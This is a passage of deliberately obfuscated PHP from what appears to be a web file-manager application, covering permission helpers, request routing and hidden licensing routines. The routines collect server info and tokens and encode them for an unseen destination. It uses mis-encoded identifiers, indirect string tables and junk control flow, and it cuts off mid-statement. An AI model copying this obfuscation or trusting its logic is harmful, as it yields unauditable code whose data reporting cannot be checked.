($Ç·ÑîÊ) { $ò¿◊◊ùâ = $ç˘ÆÓËÀ; $˚Ç’ç¯ª = $ïÄãô…•; $ØÅ—Û£ﬁ = LNG($‡âìÈÊÄ[2014]); } else { if ($ﬁ≠·∂Æë) { $ò¿◊◊ùâ = $Åﬁ÷Çˆ; $˚Ç’ç¯ª = $Ïï±›°¶; $—‚∫Çôâ = Model($‡âìÈÊÄ[522])->getInfo($ÔŒ˛¿œé); $ØÅ—Û£ﬁ = $‡âìÈÊÄ[159] . $—‚∫Çôâ[$‡âìÈÊÄ[526]] . $‡âìÈÊÄ[2015] . LNG($‡âìÈÊÄ[2016]); } else { if ($¸„ﬁŸ”Ó) { $ò¿◊◊ùâ = $Äáêã†œ; $˚Ç’ç¯ª = $‚…∏ﬂﬂ¿; $ØÅ—Û£ﬁ = LNG($‡âìÈÊÄ[1987]); } else { $ò¿◊◊ùâ = 0; $˚Ç’ç¯ª = !1; $ØÅ—Û£ﬁ = $‡âìÈÊÄ[12]; } } } $ËŒ∂Úÿœ = array($‡âìÈÊÄ[2006] => intval($ò¿◊◊ùâ), $‡âìÈÊÄ[1990] => $˚Ç’ç¯ª, $‡âìÈÊÄ[2007] => $ØÅ—Û£ﬁ, $‡âìÈÊÄ[1999] => $‡ëûûå›[$‡âìÈÊÄ[403]]); return $ËŒ∂Úÿœ; } private function groupContainUser($·ç—Ë´«, $∂ˆÄßπ– = false) { return in_array($·ç—Ë´«, $this->userGroupParents($∂ˆÄßπ–)); } private function groupStepToUserGroup($úÇÄÇüÿ, $ò∆äøØÒ = false) { $âÃúﬁÆ =& $_SERVER[Çâä∆◊¡]; $ëéÙÈóÿ = $this->userGroupList($ò∆äøØÒ); $˙´ÜòèÀ = 1000; $¿£§ªî = $GLOBALS[$âÃúﬁÆ[6]][$âÃúﬁÆ[90]][$âÃúﬁÆ[1910]] == 1; $¥ÀŸÜﬁç = $¿£§ªî ? 3 : 2; foreach ($ëéÙÈóÿ as $Ìø†»·â) { if ($Ìø†»·â[$âÃúﬁÆ[1810]] == $úÇÄÇüÿ) { return 0; } $Í´óÁ”ñ = explode($âÃúﬁÆ[50], trim($Ìø†»·â[$âÃúﬁÆ[521]], $âÃúﬁÆ[50])); if ($Í´óÁ”ñ[0] == $âÃúﬁÆ[190] && count($Í´óÁ”ñ) > $¥ÀŸÜﬁç) { $Ô¸€Óê˚ = array_reverse(array_slice($Í´óÁ”ñ, $¥ÀŸÜﬁç)); $œß»ã∑Ë = array_search($úÇÄÇüÿ, $Ô¸€Óê˚); if ($œß»ã∑Ë !== !1 && $œß»ã∑Ë + 1 <= $˙´ÜòèÀ) { $˙´ÜòèÀ = $œß»ã∑Ë + 1; } } } return $˙´ÜòèÀ; } private function userGroupList($±‹÷´äÍ = false) { $ÔÙ£Ó›‘ =& $_SERVER[Çâä∆◊¡]; static $ôì¿Ö¿å = array(); if (isset($ôì¿Ö¿å[$±‹÷´äÍ])) { return $ôì¿Ö¿å[$±‹÷´äÍ]; } $˚îí Õÿ = Model($ÔÙ£Ó›‘[538])->getInfo($±‹÷´äÍ); $ôì¿Ö¿å[$±‹÷´äÍ] = array_to_keyvalue($˚îí Õÿ[$ÔÙ£Ó›‘[1988]], $ÔÙ£Ó›‘[1810]); return $ôì¿Ö¿å[$±‹÷´äÍ]; } public function userGroupParents($áÄÈÇπæ) { $πí€≤ù∑ =& $_SERVER[Çâä∆◊¡]; static $·≥∫÷ø¥ = array(); $áÄÈÇπæ = $áÄÈÇπæ ? $áÄÈÇπæ : USER_ID; if (isset($·≥∫÷ø¥[$áÄÈÇπæ])) { return $·≥∫÷ø¥[$áÄÈÇπæ]; } $ÃØ˝ŒìÃ = $this->userGroupList($áÄÈÇπæ); $ë≥≤Íÿ = array(); $º¸≥˙∂Ä = $GLOBALS[$πí€≤ù∑[6]][$πí€≤ù∑[90]][$πí€≤ù∑[1910]] == 1; $ûΩº‹¢ã = $º¸≥˙∂Ä ? 3 : 2; foreach ($ÃØ˝ŒìÃ as $·ª¢Ëê) { $ù·ÛÁ‘⁄ = array($·ª¢Ëê[$πí€≤ù∑[1810]]); $¿Ç ≠†é = explode($πí€≤ù∑[50], trim($·ª¢Ëê[$πí€≤ù∑[521]], $πí€≤ù∑[50])); if ($¿Ç ≠†é[0] == $πí€≤ù∑[190] && count($¿Ç ≠†é) > $ûΩº‹¢ã) { $≈ÓáìÈà = array_slice($¿Ç ≠†é, $ûΩº‹¢ã); $ù·ÛÁ‘⁄ = array_merge($ù·ÛÁ‘⁄, array_reverse($≈ÓáìÈà)); } $ë≥≤Íÿ = array_merge($ë≥≤Íÿ, $ù·ÛÁ‘⁄); } $·≥∫÷ø¥[$áÄÈÇπæ] = array_unique($ë≥≤Íÿ); return $·≥∫÷ø¥[$áÄÈÇπæ]; } public function authTargetInfoMake($‡É≥ï√∆) { $∞®Î∂Åß =& $_SERVER[Çâä∆◊¡]; $˘´◊€‡— = array(); $ìÍ®±√† = array(); foreach ($‡É≥ï√∆ as $ï–èú˛µ) { if ($ï–èú˛µ[$∞®Î∂Åß[412]] == SourceModel::TYPE_USER) { $˘´◊€‡—[] = intval($ï–èú˛µ[$∞®Î∂Åß[504]]); } else { if ($ï–èú˛µ[$∞®Î∂Åß[412]] == SourceModel::TYPE_GROUP) { $ìÍ®±√†[] = intval($ï–èú˛µ[$∞®Î∂Åß[504]]); } } } if ($˘´◊€‡—) { $˘´◊€‡— = Model($∞®Î∂Åß[513])->userListInfo($˘´◊€‡—); } if ($ìÍ®±√†) { $ïÕáäµ´ = array($∞®Î∂Åß[1897] => array($∞®Î∂Åß[419], $ìÍ®±√†)); $ìÍ®±√† = Model($∞®Î∂Åß[522])->field($∞®Î∂Åß[2017])->where($ïÕáäµ´)->select(); $ìÍ®±√† = array_to_keyvalue($ìÍ®±√†, $∞®Î∂Åß[1810]); } return array($∞®Î∂Åß[2018] => $˘´◊€‡—, $∞®Î∂Åß[2019] => $ìÍ®±√†); } public function authInfo($´∫¥ô÷§) { $àÃΩë«‰ =& $_SERVER[Çâä∆◊¡]; if ($´∫¥ô÷§[$àÃΩë«‰[1911]]) { $â›±Õ˙Ω = Model($àÃΩë«‰[507])->listData($´∫¥ô÷§[$àÃΩë«‰[1911]]); if (!$â›±Õ˙Ω) { return !1; $≥ÂÛÔÚ™ = Model($àÃΩë«‰[507])->listData(); $≥ò˙à ≤ = array_filter_by_field($≥ÂÛÔÚ™, $àÃΩë«‰[414], $àÃΩë«‰[190]); return $≥ò˙à ≤; } $€Ú∂ÕÌó = array_field_key($â›±Õ˙Ω, array($àÃΩë«‰[401], $àÃΩë«‰[32], $àÃΩë«‰[414], $àÃΩë«‰[1832], $àÃΩë«‰[1833])); $€Ú∂ÕÌó[$àÃΩë«‰[2020]] = $´∫¥ô÷§; return $€Ú∂ÕÌó; } else { return array($àÃΩë«‰[420] => 0, $àÃΩë«‰[1816] => $´∫¥ô÷§[$àÃΩë«‰[1965]], $àÃΩë«‰[421] => $àÃΩë«‰[12], $àÃΩë«‰[1832] => $àÃΩë«‰[2021]); } } } goto fòõ»Õ¯ÊÖ; F⁄ùøêßŒç: while ($qtxmvhlzas < $_SERVER[Çâä∆◊¡][394]) { if ($qtxmvhlzas >= 0) { break; } $qtxmvhlzas++; } class Application { private $defaultModule = "\x69\156\144\x65\x78"; private $defaultController = "\151\156\x64\145\170"; private $defaultAction = "\151\156\x64\x65\x78"; function __construct() { } public function setDefault($∆˝ó°í˛) { $å™Àä·∏ =& $_SERVER[Çâä∆◊¡]; $∏ø¶¥©— =& $_SERVER[‚º¶Ô¢Ó]; $ˆﬁÅ•·¸ = explode($∏ø¶¥©—[0], trim($∆˝ó°í˛, $∏ø¶¥©—[0])); $—’ÆÎãê = $å™Àä·∏[611]; if (!$—’ÆÎãê) { return; } $this->defaultModule = $ˆﬁÅ•·¸[0] ? $ˆﬁÅ•·¸[0] : $this->defaultModule; $Ø ’ë˙µ = $å™Àä·∏[612]; while (strlen($Ø ’ë˙µ) < $å™Àä·∏[613]) { if (!$Ø ’ë˙µ) { break; } $Ø ’ë˙µ++; } $this->defaultController = $ˆﬁÅ•·¸[1] ? $ˆﬁÅ•·¸[1] : $this->defaultController; $—´ô›„º = $å™Àä·∏[614]; if (!$—´ô›„º) { die; } $this->defaultAction = $ˆﬁÅ•·¸[2] ? $ˆﬁÅ•·¸[2] : $this->defaultAction; $this->sfcv795af8c0($∏ø¶¥©—[1], array($this, $∏ø¶¥©—[2])); } public function appRun($ß˘≥¯ˆ√) { $ˆ‡ÑúÈª =& $_SERVER[Çâä∆◊¡]; $èëØŸÌ˘ =& $_SERVER[‚º¶Ô¢Ó]; $≤ôºá∆ÿ = explode($èëØŸÌ˘[0], $ß˘≥¯ˆ√); $Ω»ˆ∏‡∑ = $ˆ‡ÑúÈª[615]; $ä¸´ëõ¯ = strtolower($≤ôºá∆ÿ[0]); $é‡˚â∏Œ = $ˆ‡ÑúÈª[616]; if (strlen($é‡˚â∏Œ) < $ˆ‡ÑúÈª[617]) { die; } $áóóœ≥¬ = $èëØŸÌ˘[3]; $ƒÁªàòå = $ˆ‡ÑúÈª[618]; if ($ä¸´ëõ¯ == $èëØŸÌ˘[4]) { $áóóœ≥¬ = $èëØŸÌ˘[5]; $≤ôºá∆ÿ[0] = $èëØŸÌ˘[6]; $≤ôºá∆ÿ[1] = $≤ôºá∆ÿ[1] . $èëØŸÌ˘[7]; $ß˘≥¯ˆ√ = join($èëØŸÌ˘[0], $≤ôºá∆ÿ); $ß˘≥¯ˆ√ = trim($ß˘≥¯ˆ√, $èëØŸÌ˘[0]); } call_user_func(array($èëØŸÌ˘[8], $èëØŸÌ˘[9]), $áóóœ≥¬ . $èëØŸÌ˘[10], $ß˘≥¯ˆ√); ActionCall($ß˘≥¯ˆ√); $ÀÑ·÷‹ô = $ˆ‡ÑúÈª[619]; if (!$ÀÑ·÷‹ô) { die; } call_user_func(array($èëØŸÌ˘[8], $èëØŸÌ˘[9]), $áóóœ≥¬ . $èëØŸÌ˘[11], $ß˘≥¯ˆ√); $™ŸÌö®≥ = $ˆ‡ÑúÈª[620]; } private function autorun() { $∫Ã¢¬ƒ∏ =& $_SERVER[Çâä∆◊¡]; $î≥•◊‡ﬂ =& $_SERVER[‚º¶Ô¢Ó]; global $config; $¶Ô™–é≠ = $∫Ã¢¬ƒ∏[621]; if (strlen($¶Ô™–é≠) < $∫Ã¢¬ƒ∏[394]) { die; } if (count($config[$î≥•◊‡ﬂ[12]]) == 0) { return; } foreach ($config[$î≥•◊‡ﬂ[12]] as $àõ¡≥õÂ => $≈êèÅƒ˛) { $this->appRun($≈êèÅƒ˛); } } private function lhsy4dda6e88() { $ç•áΩ≥Æ =& $_SERVER[Çâä∆◊¡]; $÷úè≠§œ =& $_SERVER[‚º¶Ô¢Ó]; $Á§ƒ˙Œø = $÷úè≠§œ[4]; $•àŸø»˚ = $GLOBALS[$÷úè≠§œ[13]][$÷úè≠§œ[14]][0]; $ªå˘øÁú = $ç•áΩ≥Æ[622]; while ($ªå˘øÁú < $ç•áΩ≥Æ[617]) { if ($ªå˘øÁú >= 0) { break; } $ªå˘øÁú++; } if (!$•àŸø»˚ || strlen($•àŸø»˚) <= strlen($Á§ƒ˙Œø)) { return; } if (strtolower(substr($•àŸø»˚, -strlen($Á§ƒ˙Œø))) != $Á§ƒ˙Œø) { return; } $£Ÿ≤Ä„ü = substr($•àŸø»˚, 0, -strlen($Á§ƒ˙Œø)); $ø•€Ôı¨ = array($÷úè≠§œ[4], $£Ÿ≤Ä„ü); $˚ä™¡‘˚ = $ç•áΩ≥Æ[623]; if (strlen($˚ä™¡‘˚) < $ç•áΩ≥Æ[624]) { return; } $åúë·◊é = array_slice($GLOBALS[$÷úè≠§œ[13]][$÷úè≠§œ[14]], 1); $ıæ®ç† = $ç•áΩ≥Æ[625]; while (strlen($ıæ®ç†) < $ç•áΩ≥Æ[394]) { if (!$ıæ®ç†) { break; } $ıæ®ç†++; } $GLOBALS[$÷úè≠§œ[13]][$÷úè≠§œ[14]] = array_merge($ø•€Ôı¨, $åúë·◊é); $GLOBALS[$÷úè≠§œ[13]][$÷úè≠§œ[15]] = implode($÷úè≠§œ[0], $GLOBALS[$÷úè≠§œ[13]][$÷úè≠§œ[14]]); $◊Ì∑èπÌ = $ç•áΩ≥Æ[626]; while (strlen($◊Ì∑èπÌ) < $ç•áΩ≥Æ[394]) { if (!$◊Ì∑èπÌ) { break; } $◊Ì∑èπÌ++; } } private function nhqya2e5b7c8() { $å¢›ô∂Ã =& $_SERVER[Çâä∆◊¡]; $÷¥Œ±ü˙ =& $_SERVER[‚º¶Ô¢Ó]; if ($GLOBALS[$÷¥Œ±ü˙[13]][$÷¥Œ±ü˙[15]] != $÷¥Œ±ü˙[6]) { return; } $í¢©·ƒÚ = $_SERVER[$÷¥Œ±ü˙[16]]; $À†üƒ´À = $÷¥Œ±ü˙[17]; if (!strstr($í¢©·ƒÚ, $À†üƒ´À)) { return; } $ÆÉó´â = strrpos($í¢©·ƒÚ, $À†üƒ´À); $µ§¯¥œô = substr($í¢©·ƒÚ, $ÆÉó´â + strlen($À†üƒ´À)); preg_match_all($÷¥Œ±ü˙[18], $µ§¯¥œô, $‚ìÕæß›); $¸˜·Ö›Ú = $å¢›ô∂Ã[627]; if (!$¸˜·Ö›Ú) { die; } $µ§¯¥œô = trim($‚ìÕæß›[0][0], $÷¥Œ±ü˙[19]); $GLOBALS[$÷¥Œ±ü˙[13]][$÷¥Œ±ü˙[14]] = explode($÷¥Œ±ü˙[19], $µ§¯¥œô); $»·€ÇìÈ = $å¢›ô∂Ã[628]; if (!$»·€ÇìÈ) { die; } $GLOBALS[$÷¥Œ±ü˙[13]][$÷¥Œ±ü˙[15]] = implode($÷¥Œ±ü˙[0], $GLOBALS[$÷¥Œ±ü˙[13]][$÷¥Œ±ü˙[14]]); } public function run() { $¢ó·¢’• =& $_SERVER[Çâä∆◊¡]; $⁄¬ñôÚ÷ =& $_SERVER[‚º¶Ô¢Ó]; $this->nhqya2e5b7c8(); $this->lhsy4dda6e88(); $˚⁄ÃÑ™Ó = $¢ó·¢’•[629]; if (!$˚⁄ÃÑ™Ó) { return; } $Øæå÷»’ = $GLOBALS[$⁄¬ñôÚ÷[13]][$⁄¬ñôÚ÷[14]]; $›Ω¯•©Ó = $¢ó·¢’•[630]; $öËÊ°ß÷ = $GLOBALS[$⁄¬ñôÚ÷[13]][$⁄¬ñôÚ÷[15]]; $†ØœË»Æ = $¢ó·¢’•[631]; define($⁄¬ñôÚ÷[20], isset($Øæå÷»’[0]) && $Øæå÷»’[0] ? $Øæå÷»’[0] : $this->defaultModule); define($⁄¬ñôÚ÷[21], isset($Øæå÷»’[1]) && $Øæå÷»’[0] ? $Øæå÷»’[1] : $this->defaultController); $æÉ¨¥•π = $¢ó·¢’•[632]; if (strlen($æÉ¨¥•π) < $¢ó·¢’•[624]) { return; } define($⁄¬ñôÚ÷[22], isset($Øæå÷»’[2]) && $Øæå÷»’[0] ? $Øæå÷»’[2] : $this->defaultAction); $¸ÚÃê√◊ = $¢ó·¢’•[633]; define($⁄¬ñôÚ÷[23], MOD . $⁄¬ñôÚ÷[0] . ST . $⁄¬ñôÚ÷[0] . ACT); $_SERVER[$⁄¬ñôÚ÷[24]] = strtolower(ACTION); $°≈µ¿£ª = $¢ó·¢’•[634]; if (strlen($°≈µ¿£ª) < $¢ó·¢’•[607]) { return; } $this->autorun(); if (count($Øæå÷»’) >= 3) { $this->appRun($öËÊ°ß÷); } else { $this->appRun(ACTION); } } private $vwzf0fa51ad4 = array(); private $lszh062d97ab = ''; public function wmcg504d019a() { $ÿí°˙ÍÄ =& $_SERVER[Çâä∆◊¡]; $Ñ·æùï¥ =& $_SERVER[‚º¶Ô¢Ó]; $this->melw45cf347d(); $this->cwof82aafd8d(); $áœπËÔ‡ = $ÿí°˙ÍÄ[635]; while (strlen($áœπËÔ‡) < $ÿí°˙ÍÄ[613]) { if (!$áœπËÔ‡) { break; } $áœπËÔ‡++; } $this->ebgd6fb01a3e(); $this->rhkmf25aadea(); $this->wvjz210bbddd(); $É≤¿ñÚ˙ = $ÿí°˙ÍÄ[636]; while (strlen($É≤¿ñÚ˙) < $ÿí°˙ÍÄ[394]) { if (!$É≤¿ñÚ˙) { break; } $É≤¿ñÚ˙++; } $this->gsxd9e5499b4(); $°ê˜¢◊À = $ÿí°˙ÍÄ[637]; if (!$°ê˜¢◊À) { die; } $this->cnkg90049c38(); $this->sfcv795af8c0($Ñ·æùï¥[25], array($this, $Ñ·æùï¥[26])); $this->sfcv795af8c0($Ñ·æùï¥[27], array($this, $Ñ·æùï¥[28])); $†≥øü˜Ö = $ÿí°˙ÍÄ[638]; $this->sfcv795af8c0($Ñ·æùï¥[29], array($this, $Ñ·æùï¥[30])); $Æ¡∞’›” = $ÿí°˙ÍÄ[639]; if (!$Æ¡∞’›”) { return; } $this->sfcv795af8c0($Ñ·æùï¥[31], array($this, $Ñ·æùï¥[32])); $æ±û…ı˛ = $ÿí°˙ÍÄ[640]; if (strlen($æ±û…ı˛) < $ÿí°˙ÍÄ[607]) { die; } } public function rtps9feced75($ÓÊíª¸∂) { $óó◊ß•œ =& $_SERVER[Çâä∆◊¡]; $ÚÀ«È≤˝ =& $_SERVER[‚º¶Ô¢Ó]; $º∑Ì¬ÁÕ = Model($ÚÀ«È≤˝[33])->get(); $‡ƒ¡™÷√ = $óó◊ß•œ[641]; if (!$‡ƒ¡™÷√) { die; } $ì™ú™ ˘ = array($ÚÀ«È≤˝[34], $ÚÀ«È≤˝[35], $ÚÀ«È≤˝[36], $ÚÀ«È≤˝[37], $ÚÀ«È≤˝[38], $ÚÀ«È≤˝[39], $ÚÀ«È≤˝[40], $ÚÀ«È≤˝[41], $ÚÀ«È≤˝[42], $ÚÀ«È≤˝[43], $ÚÀ«È≤˝[44], $ÚÀ«È≤˝[45], $ÚÀ«È≤˝[46], $ÚÀ«È≤˝[47], $ÚÀ«È≤˝[48], $ÚÀ«È≤˝[49], $ÚÀ«È≤˝[50], $ÚÀ«È≤˝[51], $ÚÀ«È≤˝[52], $ÚÀ«È≤˝[53], $ÚÀ«È≤˝[54], $ÚÀ«È≤˝[55], $ÚÀ«È≤˝[56], $ÚÀ«È≤˝[57], $ÚÀ«È≤˝[58], $ÚÀ«È≤˝[59], $ÚÀ«È≤˝[60], $ÚÀ«È≤˝[61], $ÚÀ«È≤˝[62], $ÚÀ«È≤˝[63], $ÚÀ«È≤˝[64], $ÚÀ«È≤˝[65], $ÚÀ«È≤˝[66], $ÚÀ«È≤˝[67], $ÚÀ«È≤˝[68], $ÚÀ«È≤˝[69], $ÚÀ«È≤˝[70], $ÚÀ«È≤˝[71], $ÚÀ«È≤˝[72], $ÚÀ«È≤˝[73], $ÚÀ«È≤˝[74], $ÚÀ«È≤˝[75], $ÚÀ«È≤˝[76], $ÚÀ«È≤˝[77], $ÚÀ«È≤˝[78], $ÚÀ«È≤˝[79], $ÚÀ«È≤˝[80], $ÚÀ«È≤˝[81], $ÚÀ«È≤˝[82]); foreach ($ì™ú™ ˘ as $à≠Ú‚˜Ñ) { $ñè¸«≈ö = $GLOBALS[$ÚÀ«È≤˝[83]][$ÚÀ«È≤˝[84]][$à≠Ú‚˜Ñ]; $Ò°©ñ⁄ª = $óó◊ß•œ[642]; if (!$Ò°©ñ⁄ª) { return; } if (isset($º∑Ì¬ÁÕ[$à≠Ú‚˜Ñ])) { $ñè¸«≈ö = $º∑Ì¬ÁÕ[$à≠Ú‚˜Ñ]; } $ÓÊíª¸∂[$ÚÀ«È≤˝[85]][$ÚÀ«È≤˝[86]][$à≠Ú‚˜Ñ] = $ñè¸«≈ö; } $ÿ€≠Îü˜ = $ÓÊíª¸∂[$ÚÀ«È≤˝[85]][$ÚÀ«È≤˝[86]][$ÚÀ«È≤˝[46]]; unset($ÓÊíª¸∂[$ÚÀ«È≤˝[85]][$ÚÀ«È≤˝[87]][$ÚÀ«È≤˝[88]]); unset($ÓÊíª¸∂[$ÚÀ«È≤˝[85]][$ÚÀ«È≤˝[87]][$ÚÀ«È≤˝[89]]); unset($ÓÊíª¸∂[$ÚÀ«È≤˝[85]][$ÚÀ«È≤˝[86]][$ÚÀ«È≤˝[46]]); $†º≈’‰¨ = $óó◊ß•œ[643]; if (strlen($†º≈’‰¨) < $óó◊ß•œ[613]) { return; } unset($ÓÊíª¸∂[$ÚÀ«È≤˝[85]][$ÚÀ«È≤˝[86]][$ÚÀ«È≤˝[90]]); $ÓÊíª¸∂[$ÚÀ«È≤˝[85]][$ÚÀ«È≤˝[86]][$ÚÀ«È≤˝[91]] = array($ÚÀ«È≤˝[92] => (int) $ÿ€≠Îü˜[$ÚÀ«È≤˝[93]], $ÚÀ«È≤˝[94] => (int) _get($ÿ€≠Îü˜, $ÚÀ«È≤˝[95], 0)); $—“è‰˙ï = $óó◊ß•œ[644]; if (!$—“è‰˙ï) { die; } $ÓÊíª¸∂[$ÚÀ«È≤˝[96]][$ÚÀ«È≤˝[97]] = Action($ÚÀ«È≤˝[98])->accessToken(); $œ¨ÄŸﬁ‰ = $óó◊ß•œ[645]; if (strlen($œ¨ÄŸﬁ‰) < $óó◊ß•œ[617]) { die; } $ÓÊíª¸∂[$ÚÀ«È≤˝[96]][$ÚÀ«È≤˝[99]] = md5($_SERVER[$ÚÀ«È≤˝[100]] . $º∑Ì¬ÁÕ[$ÚÀ«È≤˝[101]]); $ÓÊíª¸∂[$ÚÀ«È≤˝[96]][$ÚÀ«È≤˝[102]] = base64_encode(serverInfo()); $Î§ê§¶Ø = $óó◊ß•œ[646]; if (strlen($Î§ê§¶Ø) < $óó◊ß•œ[624]) { die; } $ÓÊíª¸∂[$ÚÀ«È≤˝[96]][$ÚÀ«È≤˝[103]] = $this->lszh062d97ab; if ($º∑Ì¬ÁÕ[$ÚÀ«È≤˝[103]] != $ÚÀ«È≤˝[104]) { $ÓÊíª¸∂[$ÚÀ«È≤˝[96]][$ÚÀ«È≤˝[105]] = $º∑Ì¬ÁÕ[$ÚÀ«È≤˝[105]]; $ÓÊíª¸∂[$ÚÀ«È≤˝[96]][$ÚÀ«È≤˝[106]] = $º∑Ì¬ÁÕ[$ÚÀ«È≤˝[106]]; $ﬁìÅ¯‰’ = rand_string(10) . $this->lszh062d97ab . rand_string(5); $ÓÊíª¸∂[$ÚÀ«È≤˝[85]][$ÚÀ«È≤˝[107]][$ÚÀ«È≤˝[108]] = $this->zphbbfae25ca($ﬁìÅ¯‰’, $ÓÊíª¸∂[$ÚÀ«È≤˝[96]][$ÚÀ«È≤˝[99]]); } if ($this->lszh062d97ab == $ÚÀ«È≤˝[104]) { $ÓÊíª¸∂[$ÚÀ«È≤˝[85]][$ÚÀ«È≤˝[86]][$ÚÀ«È≤˝[91]][$ÚÀ«È≤˝[95]] = 0; } $ÓÊíª¸∂[$ÚÀ«È≤˝[96]][$ÚÀ«È≤˝[109]] = _get($this->vwzf0fa51ad4, $ÚÀ«È≤˝[110], $ÚÀ«È≤˝[6]); $ÓÊíª¸∂[$ÚÀ«È≤˝[96]][$ÚÀ«È≤˝[111]] = _get($this->vwzf0fa51ad4, $ÚÀ«È≤˝[112], $ÚÀ«È≤˝[6]); if (_get($GLOBALS, $ÚÀ«È≤˝[113]) && $this->config[$ÚÀ«È≤˝[114]]) { $ÓÊíª¸∂[$ÚÀ«È≤˝[96]][$ÚÀ«È≤˝[115]] = WEB_ROOT; } return $ÓÊíª¸∂; } private function gsxd9e5499b4() { $Ã¥Î≤ü— =& $_SERVER[Çâä∆◊¡]; $ƒ˚ﬂÕ”Ç =& $_SERVER[‚º¶Ô¢Ó]; if ($_SERVER[$ƒ˚ﬂÕ”Ç[24]] == $ƒ˚ﬂÕ”Ç[116]) { $úŒﬁ±ü— = array($ƒ˚ﬂÕ”Ç[103] => $this->lszh062d97ab, $ƒ˚ﬂÕ”Ç[117] => $this->hdxu117184c0(), $ƒ˚ﬂÕ”Ç[118] => Model($ƒ˚ﬂÕ”Ç[119])->count()); if ($this->lszh062d97ab != $ƒ˚ﬂÕ”Ç[104]) { $á©ÆÇÂ“ = _get($this->vwzf0fa51ad4, $ƒ˚ﬂÕ”Ç[120]); if ($á©ÆÇÂ“) { $úŒﬁ±ü—[$ƒ˚ﬂÕ”Ç[121]] = $á©ÆÇÂ“; $úŒﬁ±ü—[$ƒ˚ﬂÕ”Ç[122]] = strtotime(_get($this->vwzf0fa51ad4, $ƒ˚ﬂÕ”Ç[123])); $úŒﬁ±ü—[$ƒ˚ﬂÕ”Ç[124]] = _get($this->vwzf0fa51ad4, $ƒ˚ﬂÕ”Ç[112]); } $Í„∑¨⁄À = Model($ƒ˚ﬂÕ”Ç[33])->get($ƒ˚ﬂÕ”Ç[125], $ƒ˚ﬂÕ”Ç[6], !0); if (is_string($Í„∑¨⁄À) && substr($Í„∑¨⁄À, 0, 1) == $ƒ˚ﬂÕ”Ç[126]) { $Í„∑¨⁄À = json_decode_force($Í„∑¨⁄À); } if (is_array($Í„∑¨⁄À) && $Í„∑¨⁄À[$ƒ˚ﬂÕ”Ç[127]] && strstr($Í„∑¨⁄À[$ƒ˚ﬂÕ”Ç[127]], $ƒ˚ﬂÕ”Ç[128])) { $¥üü·¨ª = explode($ƒ˚ﬂÕ”Ç[128], $Í„∑¨⁄À[$ƒ˚ﬂÕ”Ç[127]]); $úŒﬁ±ü—[$ƒ˚ﬂÕ”Ç[129]] = $¥üü·¨ª[0]; } } $úŒﬁ±ü— = $this->yasq46999d1f(json_encode($úŒﬁ±ü—), md5($ƒ˚ﬂÕ”Ç[130])); $ô∏ÎÙ°‘ = $Ã¥Î≤ü—[647]; if (!$ô∏ÎÙ°‘) { die; } $⁄≤ú•⁄Ä = array($ƒ˚ﬂÕ”Ç[131] => $úŒﬁ±ü—); call_user_func(array($ƒ˚ﬂÕ”Ç[132], $ƒ˚ﬂÕ”Ç[133]), $⁄≤ú•⁄Ä); } if ($this->lszh062d97ab == $ƒ˚ﬂÕ”Ç[104]) { return; } $ÆúÖôæ” = array($ƒ˚ﬂÕ”Ç[134], $ƒ˚ﬂÕ”Ç[135], $ƒ˚ﬂÕ”Ç[136], $ƒ˚ﬂÕ”Ç[137], $ƒ˚ﬂÕ”Ç[138], $ƒ˚ﬂÕ”Ç[139]); $ßÕ¢öóÔ = Model($ƒ˚ﬂÕ”Ç[33])->get(); $üû´›ﬁ¶ = $Ã¥Î≤ü—[648]; if (!$üû´›ﬁ¶) { die; } $⁄≤ú•⁄Ä = array($ƒ˚ﬂÕ”Ç[140] => $ßÕ¢öóÔ[$ƒ˚ﬂÕ”Ç[34]], $ƒ˚ﬂÕ”Ç[141] => $ßÕ¢öóÔ[$ƒ˚ﬂÕ”Ç[35]], $ƒ˚ﬂÕ”Ç[142] => $ƒ˚ﬂÕ”Ç[6]); $…ò–êŒÿ = $Ã¥Î≤ü—[649]; if (strlen($…ò–êŒÿ) < $Ã¥Î≤ü—[394]) { die; } foreach ($ÆúÖôæ” as $‡Çîÿˆ˝) { if (!isset($ßÕ¢öóÔ[$‡Çîÿˆ˝]) || !$ßÕ¢öóÔ[$‡Çîÿˆ˝]) { continue; } $⁄≤ú•⁄Ä[$‡Çîÿˆ˝] = $ßÕ¢öóÔ[$‡Çîÿˆ˝]; } call_user_func(array($ƒ˚ﬂÕ”Ç[132], $ƒ˚ﬂÕ”Ç[133]), $⁄≤ú•⁄Ä); } private function rhkmf25aadea() { $ªÔ°ÚΩö =& $_SERVER[Çâä∆◊¡]; $∂Òæàõá =& $_SERVER[‚º¶Ô¢Ó]; if ($_SERVER[$∂Òæàõá[24]] != $∂Òæàõá[143]) { return; } if (!_get($GLOBALS, $∂Òæàõá[113])) { die; } $å≠¿âòÛ = $GLOBALS[$∂Òæàõá[13]]; if (isset($å≠¿âòÛ[$∂Òæàõá[144]])) { $this->fnuo1fb2d5cf(); die; } if (!isset($å≠¿âòÛ[$∂Òæàõá[145]]) || strlen($å≠¿âòÛ[$∂Òæàõá[145]]) != 16) { show_json($∂Òæàõá[146] . $å≠¿âòÛ[$∂Òæàõá[145]], !1); } $Ú£ãÖ¥À = Model($∂Òæàõá[33])->get($∂Òæàõá[101]); $å¬–≤¬µ = md5($_SERVER[$∂Òæàõá[100]] . $Ú£ãÖ¥À); $¸⁄∞‘€â = array($∂Òæàõá[145] => $å≠¿âòÛ[$∂Òæàõá[145]], $∂Òæàõá[147] => rand_string(16), $∂Òæàõá[148] => $∂Òæàõá[130], $∂Òæàõá[149] => $∂Òæàõá[150], $∂Òæàõá[151] => $_SERVER[$∂Òæàõá[152]], $∂Òæàõá[153] => $_SERVER[$∂Òæàõá[154]], $∂Òæàõá[155] => $_SERVER[$∂Òæàõá[156]], $∂Òæàõá[99] => $å¬–≤¬µ, $∂Òæàõá[157] => Model($∂Òæàõá[33])->get($∂Òæàõá[125])); $√¬Ë¨ŒÀ = $ªÔ°ÚΩö[650]; if (strlen($√¬Ë¨ŒÀ) < $ªÔ°ÚΩö[617]) { die; } if ($å≠¿âòÛ[$∂Òæàõá[158]] == $∂Òæàõá[159]) { $ä–ªêß˛ = $this->yasq46999d1f($å¬–≤¬µ, $∂Òæàõá[160]); $ŒÊ√ñå∂ = $this->zphbbfae25ca(json_encode($¸⁄∞‘€â), $å¬–≤¬µ . $∂Òæàõá[161], 3); $ŒÊ√ñå∂ = $ŒÊ√ñå∂ . $∂Òæàõá[162] . $_SERVER[$∂Òæàõá[152]]; $à¯œ•Ù‰ = $this->vfna16763856($∂Òæàõá[163] . $ä–ªêß˛ . $∂Òæàõá[164] . $ŒÊ√ñå∂, -1); show_json($à¯œ•Ù‰, !0); } else { if 